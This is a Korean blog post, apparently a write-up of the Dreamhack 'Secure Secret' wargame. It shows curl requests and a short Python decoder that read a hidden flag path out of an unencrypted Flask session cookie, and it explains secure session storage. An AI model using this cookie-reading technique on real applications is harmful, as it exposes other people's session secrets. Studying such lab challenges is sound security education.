---
layout: post
title:  "Dreamhack 워게임 Secure Secret 풀이 — Flask 세션 쿠키는 _서명_ 만 되지 _암호화_ 되지 않는다"
date:   2026-05-18 23:30:00 +0900
categories: security web wargame dreamhack writeup
---

## 들어가며

이번 글에서는 Dreamhack 웹해킹 워게임 **Secure Secret** (Unrated, 풀이자 460+ 명) 문제를 정보보안 입문자의 시점에서 단계별로 풀어봅니다. 제목 _Secure Secret_ 은 _"세션에 비밀을 안전하게 숨겼다"_ 는 출제자의 주장을 비꼬는 자조적인 제목이고, 풀이의 본질은 정확히 그 _"안전하다"_ 는 가정을 깨뜨리는 데 있습니다.

문제 설명은 친절하게도 단서를 모두 줍니다.

> 플래그 파일을 무작위한 디렉터리에 배치한 후 아무도 모르게끔 그 경로를 세션에 숨겨두었습니다.
> 문제점을 찾고 익스플로잇하여 플래그를 획득하세요!

핵심 키워드는 두 개입니다 — **랜덤 디렉터리** 와 **세션**. 출제자는 _"세션은 안전한 저장소이니 거기에 비밀을 두면 안전하다"_ 라고 가정했지만, **세션 _구현체_ 가 무엇인지** 에 따라 그 가정은 완전히 거짓이 될 수 있습니다.

> Spoiler: 풀이는 Flask 의 _기본_ `SecureCookieSession` 이 _서명만 하고 암호화는 하지 않는다_ 는 사실 하나로 끝납니다. 두 번의 `curl` 과 한 줄짜리 Python 디코더면 충분합니다.

## 1. 문제 파일 들여다보기

ZIP을 풀면 Python Flask 기반의 _아주 단순한_ 단일 파일 앱이 나옵니다.

```
Secure-Secret/
├── docker-compose.yml
└── deploy/app/
    ├── Dockerfile
    ├── flag
    └── app/
        ├── app.py
        ├── run.sh
        ├── requirements.txt
        └── templates/index.html
```

### 1-1. `app.py` — 모든 단서가 한 파일에

```python
import os, string
from flask import Flask, request, abort, render_template, session

SECRETS_PATH = 'secrets/'
ALLOWED_CHARACTERS = string.ascii_letters + string.digits + '/'

app = Flask(__name__)
app.secret_key = os.urandom(32)                                 # (a)

with open(f'{SECRETS_PATH}/sample', 'w') as f:                  # (b)
    f.write('Hello, world :)')

flag_dir = SECRETS_PATH + os.urandom(32).hex()                  # (c)
os.mkdir(flag_dir)
flag_path = flag_dir + '/flag'
with open('/flag', 'r') as f0, open(flag_path, 'w') as f1:
    f1.write(f0.read())


@app.route('/', methods=['GET'])
def get_index():
    session['secret'] = flag_path                               # (d)

    path = request.args.get('path')
    if not isinstance(path, str) or path == '':
        return render_template('index.html', msg='input the path!')

    if any(ch not in ALLOWED_CHARACTERS for ch in path):        # (e)
        return render_template('index.html', msg='invalid path!')

    full_path = f'./{SECRETS_PATH}{path}'                       # (f)
    if not os.path.isfile(full_path):
        return render_template('index.html', msg='invalid path!')

    try:
        with open(full_path, 'r') as f:
            return render_template('index.html', msg=f.read())
    except:
        abort(500)
```

처음 보고 _즉시 표시해 둘_ 다섯 줄을 살펴봅시다.

- **(a)** `app.secret_key = os.urandom(32)` — Flask 의 _쿠키 서명 키_ 가 무작위 32바이트. _서명을 위조하는_ 공격(예: `flask-unsign` 으로 키 추측 후 세션 재서명)은 사실상 불가능합니다.
- **(b)** `secrets/sample` — 단순한 인사 텍스트. 이 자체가 _"앱이 정말로 파일을 읽어서 돌려준다"_ 는 동작 증거를 주는 _샘플_ 이며, 우리가 풀이 직전 _"파일 읽기 기능이 살아 있는가"_ 를 확인하는 카나리아로 쓸 수 있습니다.
- **(c)** `flag_dir = SECRETS_PATH + os.urandom(32).hex()` — **플래그는 `secrets/{64자 hex}/flag` 라는 임의 경로** 에 들어 있습니다. 64자 hex 는 2^256 의 엔트로피로 _브루트 포스 불가능_.
- **(d)** `session['secret'] = flag_path` — **출제자가 비밀이라고 믿는 그 경로를, 매 GET / 요청마다 세션에 그대로 넣어 줌**. 우리가 GET / 한 번만 보내면 _서버가 친절히 세션 쿠키 안에 비밀을 담아 보내준다_.
- **(e)** `if any(ch not in ALLOWED_CHARACTERS for ch in path)` — `path` 파라미터는 `[A-Za-z0-9/]` 만 허용. 따옴표/점/언더스코어 등은 모두 차단. → `..`/`.\`/null byte / SQLi 류는 일체 불가. 그러나 **64자 hex + `/flag`** 은 _모두 허용 문자 집합 안에_ 있다.
- **(f)** `full_path = f'./{SECRETS_PATH}{path}'` — 사용자 `path` 를 `./secrets/` 뒤에 단순 결합. (e) 의 화이트리스트 덕분에 path traversal 은 막힌다. 정확히 _임의의 `./secrets/<hex>/flag` 형태_ 요청만 의미가 있다.

종합하면 _공격 전제 조건_ 이 매우 깔끔하게 그려집니다.

1. 우리는 _hex 디렉토리 이름만 알면_ 플래그를 GET 할 수 있다.
2. 서버는 _그 이름을 세션 쿠키에 담아_ 돌려주고 있다.
3. 따라서 _세션 쿠키의 내용물을 읽을 수 있느냐_ 가 풀이의 전부다.

### 1-2. Dockerfile — 환경 정보

```dockerfile
FROM python:3.11-alpine
ENV USER chall
RUN apk add curl
RUN adduser -D -g "" $USER
COPY --chown=root:root app /app
COPY --chown=root:root flag /
WORKDIR /app
RUN chmod 705 run.sh
RUN pip install -r requirements.txt
RUN mkdir secrets
RUN chmod 777 secrets
USER $USER
EXPOSE $PORT
ENTRYPOINT ["/bin/ash"]
CMD ["./run.sh"]
```

알 수 있는 사실:

- `flag` 가 `/flag` 로 복사된 뒤, _앱 부팅 시점_ 에 (c) 의 코드가 `/flag` 내용을 _읽어서_ `secrets/<hex>/flag` 로 _옮겨 적은_ 다음 거기서 서빙됩니다.
- 컨테이너는 _chall_ 권한으로 실행되어 `/flag` 직접 접근은 막혀 있고, `secrets/` 디렉토리는 `chmod 777` 이라 _누구나 읽을 수 있게_ 의도되어 있습니다.
- `run.sh` 는 `flask run -h 0.0.0.0` 의 _개발 서버_. 즉 _프로덕션이 아닌 _개발용 옵션 기본값_ 들이 그대로 살아 있을 가능성이 큽니다.

여기서 _**핵심**_ 한 가지를 짚고 갑니다. Flask 의 _개발 서버 기본 세션 백엔드_ 는 **`SecureCookieSessionInterface`** 입니다. 이름이 "Secure" 라서 _암호화_ 된다고 오해하기 쉽지만, 실제로 하는 일은

> **서명(serialize → sign with secret_key)** + **선택적 zlib 압축** + **base64 url-safe 인코딩**

뿐입니다. **암호화는 하지 않습니다.** 데이터는 _읽고 싶은 사람_ 누구나 _base64 디코드 + (필요시) zlib 해제_ 만 하면 평문 JSON 으로 볼 수 있습니다. _서버가 데이터를 변조하지 않았음_ 만 보장하는 것 뿐.

이 사실 하나만 알면 풀이는 사실상 끝납니다.

## 2. 풀이 — Flask 쿠키 디코드 한 줄

### 단계 1. GET / 으로 세션 쿠키 받기

```bash
URL=http://host3.dreamhack.games:18061
curl -s -i -c /tmp/jar "$URL/" | grep -i Set-Cookie
# Set-Cookie: session=.eJwtxrsVgCAMAMBd...uh9Q/fOPfpNxHzMEOoA==…; HttpOnly; Path=/
```

쿠키 값의 _첫 글자가 `.`_ 이라는 것이 의미 있는 신호입니다. Flask 는 페이로드가 일정 길이 이상이거나 압축 결과가 더 짧을 때 _zlib 으로 압축_ 하며, 이때 _접두 `.` 한 글자_ 를 붙여 표시합니다. 즉,

- `cookie = ".<b64_compressed_data>.<b64_timestamp>.<b64_signature>"`

으로 _점 4부분_ 구조가 됩니다. 압축 안 한 경우엔 _점 3부분_ (`<b64_data>.<b64_timestamp>.<b64_signature>`).

### 단계 2. 쿠키 디코드 — 9줄 Python

```python
import base64, zlib
cookie = '.eJwtxrsVgCAM...uh9Q/fOPfpNxHzMEOoA==…'   # 실제 쿠키 값 붙여넣기
parts  = cookie.split('.')
data   = parts[1]                                     # 압축형이면 index 1
data  += '=' * (-len(data) % 4)                       # base64 padding 보정
raw    = base64.urlsafe_b64decode(data)
try:
    print(zlib.decompress(raw))                       # 압축형
except zlib.error:
    print(raw)                                        # 비압축형
```

실행 결과:

```text
b'{"secret":"secrets/6918f922453a4c08273d1fbbf8e4612404695bd8b39dd11f57ee49b339cc2579/flag"}'
```

_세션이 비밀이라 주장한_ 값이 _서버가 우리에게 직접_ 보내준 쿠키 안에 _평문 JSON_ 으로 들어 있습니다. 출제자의 _"hidden"_ 은 _"공중에 적어 둠"_ 과 동의어였던 셈입니다.

### 단계 3. 플래그 파일 GET

```bash
URL=http://host3.dreamhack.games:18061
SECRET=6918f922453a4c08273d1fbbf8e4612404695bd8b39dd11f57ee49b339cc2579/flag
curl -s -G --data-urlencode "path=$SECRET" "$URL/" | grep -oE 'DH\{[^}]+\}'
# DH{FL4SK_S3SH_D3CRYP7ABL3:Vw9uh9Q/fOPfpNxHzMEOoA==}
```

플래그 _자체_ 가 _**"FL4SK_S3SH_D3CRYP7ABL3"**_ (Flask session decryptable) — 출제자가 _문제의 본질_ 을 플래그 문자열에 박아 두었습니다.

## 3. 왜 이렇게 쉽게 깨졌나 — 본질적 오해

### 3-1. _서명(sign) ≠ 암호화(encrypt)_

암호학적으로 _signing_ 과 _encryption_ 은 _완전히 다른 보안 목표_ 를 가집니다.

| 목표 | 도구 | 깨면 무엇이 되나 |
|---|---|---|
| 무결성/진본성 | HMAC, 디지털 서명 | _변조_ 가능 |
| 기밀성 | AES/ChaCha 등 _대칭 암호_ | _읽기_ 가능 |

Flask 의 기본 세션은 **HMAC 기반 서명** 입니다. 따라서

- 공격자가 _값을 바꿔서_ 서버에 보내도 _서명 검증에 실패_ 합니다 → 변조 막힘.
- 그러나 공격자가 _그 값 자체를 읽는 것_ 은 _아무것도 막지 않습니다_ → 기밀성 없음.

즉, _"세션에 비밀을 둔다"_ 는 행위는 _**그 비밀을 사용자에게 친절히 평문으로 부쳐 주는 것**_ 과 같습니다.

### 3-2. 그러면 비밀은 어디에 두어야 하나

여러 대안이 있습니다.

- **서버 측 세션 (server-side session)** — Redis/DB/파일에 세션 데이터를 두고, 클라이언트는 _ID_ 만 들고 다닌다. Flask 진영에서는 `flask-session` 패키지가 대표적이며, 이 경우 비밀 _값_ 은 클라이언트가 절대로 못 본다.
- **암호화된 쿠키** — 진짜로 _쿠키 안에 데이터를 두고 싶다면_ 서명만이 아니라 _대칭 암호화_ 까지 해야 한다. 직접 구현은 위험하므로 검증된 라이브러리(예: `itsdangerous` 의 `URLSafeTimedSerializer` + `Fernet`, 또는 Django 의 `SignedCookies` 와는 다른 _암호화_ 옵션) 를 쓴다.
- **그냥 비밀을 _쿠키에 두지 않는다_** — 가장 단순한 답. 매 요청마다 _서버가_ DB / 환경변수 / 파일에서 비밀을 다시 가져온다.

이 문제의 출제 의도는 정확히 _첫째 옵션도 셋째 옵션도 쓰지 않고 Flask 의 디폴트 (a.k.a. 클라이언트-쿠키 세션) 만 믿었을 때_ 무엇이 깨지는지를 보여주는 것입니다.

### 3-3. `ALLOWED_CHARACTERS` 필터는 _이 문제에서_ 적절했다

`[A-Za-z0-9/]` 만 허용한 화이트리스트는 _path traversal_, _NULL byte_, _SSTI_(템플릿 메타문자), _SQL 메타문자_, _커맨드 메타문자_ 등을 모두 막습니다. 동시에 _hex 디렉토리 이름 + `/flag`_ 라는 _정상 입력 형식_ 은 그대로 통과시킵니다. **방어 자체는 잘 짠 코드** 입니다.

따라서 _이 문제가 깨진 이유_ 는 _경로 필터의 결함_ 이 아니라 _**세션 신뢰 모델의 결함**_ 입니다. _코드의 한 줄_ 이 잘못된 것이 아니라 _아키텍처의 한 가정_ 이 잘못된 것입니다. 입문자가 _**"필터를 우회한다"**_ 가 아니라 _**"신뢰 경계를 다시 그린다"**_ 의 관점으로 풀이를 봐주면 좋겠습니다.

## 4. 한 발 더 — 같은 약점이 _실무_ 에서 어떻게 나타날까

### 4-1. _권한_ 을 세션에 적어 두는 패턴

```python
session['is_admin'] = user.is_admin
```

이런 코드는 _서명 키가 안 새는 한_ 변조는 막힙니다. 그러나 _읽기_ 는 막지 못합니다. _is_admin_ 같은 _권한 플래그_ 는 _서버 쪽 DB_ 에서 매번 다시 조회해야 합니다. _UID 만 세션에 넣고, 권한은 서버에서_.

### 4-2. _OAuth state / CSRF 토큰_ 을 쿠키에 평문으로 넣기

Flask-Login, Flask-WTF 같은 라이브러리는 _서명_ 만 보장하는 쿠키 위에 _보안 토큰_ 을 얹는 경우가 있습니다. 토큰이 _공개되어도 단방향_ 인 nonce 이면 괜찮지만, _재사용 시 권한 상승_ 이 가능한 값이면 위험합니다. 항상 _쿠키 평문이 공개됐을 때_ 도 시스템이 안전한지를 확인해야 합니다.

### 4-3. _API 키 / 외부 시스템 토큰_ 을 세션에 넣기

가장 흔한 안티 패턴. 예: 구글 OAuth `access_token` 을 Flask 세션에 직접 넣는 코드. _서명만 되는_ 세션에 들어가는 순간, 사용자의 _쿠키만 가져가면_ 해당 OAuth 자격을 그대로 쓸 수 있게 됩니다. 토큰은 _서버 측 저장소_ 에 두고, _세션엔 사용자 ID 만_.

### 4-4. _Django/Rails/Express_ 도 같은 함정이 있나?

- **Django** : 기본 세션은 _DB 백엔드_ (서버 측). 그러나 `SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'` 옵션이 존재하며, 이걸 켜면 _Flask 와 동일하게 서명만 된 쿠키 세션_ 이 됩니다. 위험.
- **Express (Node)** : `express-session` 은 _세션 ID_ 만 쿠키에 넣고 데이터는 서버에 둠 (기본 MemoryStore — 프로덕션 부적합, Redis 등 권장). _데이터를 쿠키에 두는_ 별도 미들웨어 `cookie-session` 은 서명만 함.
- **Rails** : `CookieStore` 가 기본인 시절이 있었지만, _Rails 5.2_ 부터 `aes-256-gcm` 으로 _암호화되는_ 쿠키가 기본. _옛 코드 베이스_ 에서는 여전히 위험.

결국 _어떤 프레임워크든_ "쿠키 기반 세션을 _서명만 한 채_ 쓸 옵션이 존재" 하며, _기본값을 모른 채_ "비밀을 세션에 두면 안전" 으로 가정하면 동일한 사고가 납니다.

## 5. 정리 — 입문자가 가져갈 교훈

- **_Sign_ 과 _Encrypt_ 를 동의어로 쓰지 말자.** 라이브러리/프레임워크 문서에서 _세션이 어떤 보안 속성을 갖는지_ 정확히 확인해라.
- **Flask 의 기본 세션은 _서명만_ 된다.** 비밀을 거기에 두지 말자. (또는 `flask-session` + Redis 같은 _서버 측 저장소_ 를 켜라.)
- **쿠키 값에 _접두 `.`_ 이 있으면 _zlib 압축형_ 이다.** 디버깅/풀이 시 `cookie.split('.')[1]` → base64 decode → zlib decompress 의 _세 단계_ 만 기억하면 어떤 Flask 쿠키도 1분 안에 읽힌다.
- **필터의 견고함과 비밀 보관의 견고함은 다른 차원의 문제다.** _입력_ 을 잘 막아도 _출력 (쿠키)_ 에서 비밀을 누설하면 깨진다.
- **`flask-unsign` 류 툴을 평소에 갖춰두자.** 본 문제에선 쓸 일이 없지만, _서명 키 약함_ 같은 다른 클래스의 문제에서는 표준 도구.

이 문제는 _"코드 한 줄로 비밀을 누설한다"_ 는 *Flask 디폴트의 함정* 을 그림처럼 보여주는 _교과서 케이스_ 입니다. 비슷한 패턴을 회사 코드에서 본다면 _코드 리뷰의 가장 큰 적신호_ 입니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. 처음 30초 동안 _path traversal_ 만 의심했다

`?path=` 라는 노골적인 파라미터 이름을 보고 _자동으로_ path traversal 을 의심했습니다. `..`, `..%2f`, NULL byte, `..\\`, 인코딩 우회를 떠올렸지만, `ALLOWED_CHARACTERS = [A-Za-z0-9/]` 가 _모두 차단_ 하는 _완전한 화이트리스트_ 임을 1분쯤 지나서 확인하고서야 _"여기는 막혔으니 다른 곳을 보자"_ 로 방향 전환을 했습니다.

**회고**: 화이트리스트 _필터_ 는 _보통 굳건하다_. _첫 30초_ 에 "필터 우회"보다 _"필터가 막지 않는 동작"_ 을 그려보자. 이 문제에서는 _hex/flag_ 가 정상 통과되는 입력 형식이므로 _"어떻게 hex 를 얻나"_ 가 즉시 떠올라야 했다.

### 실패 2. 세션 쿠키 디코드 시 _압축 여부_ 를 한 번에 못 잡았다

쿠키 첫 글자가 `.` 인 것을 _구분자_ 로만 보고, `parts[0]` 을 base64 디코드하려다 빈 문자열이 나와서 잠시 헤맸습니다. Flask 의 _리딩 닷_ 은 _압축 표시 메타 정보_ 라는 점을 알기 전까지 1분 정도 손실.

**회고**: Flask 세션 쿠키의 _리딩 `.`_ 은 _zlib 압축 마커_. 이 표기 규약은 `itsdangerous` 의 `URLSafeTimedSerializer` 가 `is_text_serializer=True` + compress 옵션에서 쓰는 _문서화된 동작_. 다음부터는 _쿠키 앞에 `.` 있으면 → parts[1] + zlib.decompress_ 로 즉시 시도한다.

### 실패 3. _브루트 포스_ 를 잠깐 검토했다

`os.urandom(32).hex()` 의 _시작 N글자만_ 알면 디렉토리 단위로 좁힐 수 있지 않을까? `os.path.isfile()` 의 timing 차이가 누설되지 않을까? — 이런 옆길을 잠깐 생각했지만 즉시 _계산 비용이 우주적임_ 을 알아채고 폐기.

**회고**: 256비트 엔트로피 _자체_ 를 공격하려는 시도는 _시간 낭비_. 256비트 엔트로피가 등장하면 _공격 표면은 그 엔트로피가 _저장된 곳_ 또는 _전달된 곳__ 으로 이동한다. 이 문제는 _전달된 곳_(세션 쿠키)이 공격 표면이었다.

이 세 가지가 다음 비슷한 클래스의 문제에서 _첫 30초 의사결정_ 을 더 빠르게 해줄 학습 포인트입니다.
